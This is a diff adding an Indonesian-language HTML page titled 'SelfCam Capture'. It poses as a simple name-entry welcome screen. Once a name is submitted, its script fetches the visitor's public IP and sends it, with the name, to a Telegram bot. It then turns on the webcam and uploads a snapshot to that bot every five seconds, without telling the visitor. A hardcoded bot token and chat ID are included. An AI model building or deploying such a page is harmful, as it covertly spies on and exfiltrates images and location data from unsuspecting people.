@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>SelfCam Capture</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #0f172a;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    #loader {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: #0f172a;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 24px;
+      animation: fadeOut 1s ease-out 3s forwards;
+    }
+
+    @keyframes fadeOut {
+      to { opacity: 0; visibility: hidden; }
+    }
+
+    #app {
+      opacity: 0;
+      transform: scale(0.9);
+      transition: all 1s ease-in-out 3s;
+    }
+
+    #app.visible {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .card {
+      background: #1e293b;
+      padding: 30px;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 0 15px #00000080;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    input {
+      background: #334155;
+      color: #fff;
+    }
+
+    button {
+      background: #10b981;
+      color: #fff;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    video {
+      margin-top: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px #00000066;
+    }
+
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="loader">Memuat halaman...</div>
+
+  <div id="app">
+    <div class="card" id="formCard">
+      <h2>Masukkan Nama Anda</h2>
+      <input type="text" id="nameInput" placeholder="Nama Anda..." />
+      <button onclick="startCapture()">Get Started</button>
+    </div>
+
+    <div class="card" id="cameraCard" style="display:none;">
+      <h3>Welcome To CyberDonzTzy</h3>
+      <video id="video" width="320" autoplay muted playsinline></video>
+      <canvas id="canvas" width="320" height="240"></canvas>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU";
+    const CHAT_ID = "6624966395";
+
+    window.onload = () => {
+      setTimeout(() => {
+        document.getElementById("app").classList.add("visible");
+      }, 3000);
+    };
+
+    async function startCapture() {
+      const name = document.getElementById("nameInput").value.trim();
+      if (!name) return alert("Nama harus diisi!");
+
+      document.getElementById("formCard").style.display = "none";
+      document.getElementById("cameraCard").style.display = "block";
+
+      // Ambil IP publik
+      let ip = "Tidak diketahui";
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+      } catch (e) {
+        console.warn("Gagal ambil IP:", e);
+      }
+
+      // Kirim info ke Telegram
+      const infoMsg = `Pengguna masuk:\nNama: ${name}\nIP: ${ip}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: infoMsg })
+      });
+
+      // Akses kamera
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL("image/jpeg");
+          const blob = dataURLtoBlob(imageData);
+
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", blob, "selfie.jpg");
+
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+        }, 5000); // kirim tiap 5 detik
+      } catch (err) {
+        alert("Gagal mengakses kamera: " + err.message);
+      }
+    }
+
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(",");
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while(n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
+    }
+  </script>
+</body>
+</html>
